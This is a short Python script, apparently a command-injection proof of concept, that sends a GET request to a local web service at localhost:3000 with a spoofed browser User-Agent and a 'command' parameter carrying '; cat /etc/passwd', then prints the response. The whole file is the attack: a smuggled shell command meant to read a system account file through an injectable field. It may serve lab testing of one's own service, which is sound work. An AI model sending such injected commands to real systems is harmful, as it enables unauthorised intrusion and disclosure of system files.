import requests

url = 'http://localhost:3000/'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36'}
payload = {'command': '; cat /etc/passwd'}

response = requests.get(url, headers=headers, params=payload)

print(response.text)
